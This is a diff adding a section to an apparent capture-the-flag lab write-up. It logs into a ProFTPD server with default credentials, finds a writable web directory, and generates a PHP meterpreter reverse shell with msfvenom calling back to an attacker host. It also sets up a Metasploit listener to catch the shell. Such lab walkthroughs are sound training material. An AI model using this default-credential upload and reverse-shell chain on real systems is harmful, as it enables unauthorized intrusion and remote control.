@@ -285,3 +285,129 @@ Looking at the results we get from dirb we can see that 172.16.37.234/40180/xyz/
 <br/>
 <img src="/assets/images/ctf3/source172_16_37_234.png" height="100%" width="100%">
 <br/>
+
+Additionally,inspecting the source code for http://172.16.37.220 we find the following page. 
+<br/>
+<img src="/assets/images/ctf3/source172_16_37_220.png" height="100%" width="100%">
+<br/>
+
+Both pages inform us about a network that we can't yet access. In order to get access to it we will have to compromise one of the two machines. The FTP service 40121 on 172.16.37.234 looks promising. Let's start here.
+<br/>
+
+<details> 
+  <summary> <b>ftp 172.16.37.234 40121</b> </summary>
+  
+```bash
+
+┌──(root💀kali)-[~]
+└─# ftp 172.16.37.234 40121
+Connected to 172.16.37.234.
+220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
+Name (172.16.37.234:enrique): ftpuser
+331 Password required for ftpuser.
+Password:
+230 User ftpuser logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4096 Feb 15 21:29 html
+226 Transfer complete.
+ftp> cd html
+250 CWD command successful
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 root     root        11321 Mar 28  2019 index.html
+drwxrwxrwx   2 root     root         4096 Mar 28  2019 xyz
+226 Transfer complete.
+ftp> 
+
+```
+</details>
+<br/>
+Using the default credentials  we are able to explore the FTP server. Note that by issuing some basic commands we can identify that the FTP service allows file uploads to the web root. This is a solid attack vector for remote code execution.
+Therefore, let's create a reverse shell.
+
+```bash
+msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.10 lport=53 -o meterpreter.php
+```
+
+In oder to upload the shell we just created via ftp we need to set up a listener. We can do this with Metasploit as follows:
+
+<details> 
+  <summary> <b>Metasploit Listener and initial Metasploit configuration</b> </summary>
+  
+```bash
+
+──(root💀kali)-[~]
+└─# msfconsole  
+                                                  
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v6.0.28-dev                          ]
++ -- --=[ 2097 exploits - 1128 auxiliary - 356 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: View missing module options with show 
+missing
+
+msf6 > workspace
+  blackbox1
+  blackbox2
+* default
+msf6 > workspace -a blackbox3
+[*] Added workspace: blackbox3
+[*] Workspace: blackbox3
+msf6 > db_status
+[*] Connected to msf. Connection type: postgresql.
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > set lhost 10.13.37.10
+lhost => 10.13.37.10
+msf6 exploit(multi/handler) > set lport 53
+lport => 53
+msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.13.37.10:53 
+
+```
+</details>
+<br/>
+
+We can now go ahead and upload the file to obtain a remote shell.
+
+
